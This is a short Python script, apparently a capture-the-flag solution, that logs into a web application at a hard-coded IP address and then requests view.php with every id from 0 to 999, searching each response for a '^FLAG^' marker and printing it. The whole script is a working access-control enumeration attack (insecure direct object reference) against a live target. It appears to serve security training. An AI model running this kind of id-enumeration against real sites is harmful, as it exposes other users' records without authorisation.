import requests
from lxml import html

USERNAME = "user"
PASSWORD = "password"

LOGIN_URL = "http://35.196.135.216/7a9cb7db9d/index.php?page=sign_in.php"
URL = "http://35.196.135.216/7a9cb7db9d/index.php?page=view.php&id="

def main():
    session_requests = requests.session()

    # Get login csrf token
    result = session_requests.get(LOGIN_URL)
    tree = html.fromstring(result.text)
    print (result.headers)

    # Create payload
    payload = {
        "username": USERNAME, 
        "password": PASSWORD
    }

    # Perform login
    result = session_requests.post(LOGIN_URL, data = payload, headers = dict(referer = LOGIN_URL))

    # Check Urls in range
    for i in range(1000):
        # insert Id
        HelpURL = URL +str(i)

        #Send request
        result = session_requests.get(HelpURL, headers = dict(referer = URL),stream=False)
        tree = html.fromstring(result.content)

        #Look for flag in binary
        if b'^FLAG^' in result.content:
            print('success at id: ' + str(i))

            #decode binary to ascii
            s=result.content.decode('ascii')

            #Find the word FLAG (^ made some troubles)
            pos = s.find('FLAG')
            print ('Flag at position ' + str(pos))

            #print the whole flag (including ^)
            print(s[pos-1:pos+75])
            
        else:
            print('check id: ' + str(i))

if __name__ == '__main__':
    main()
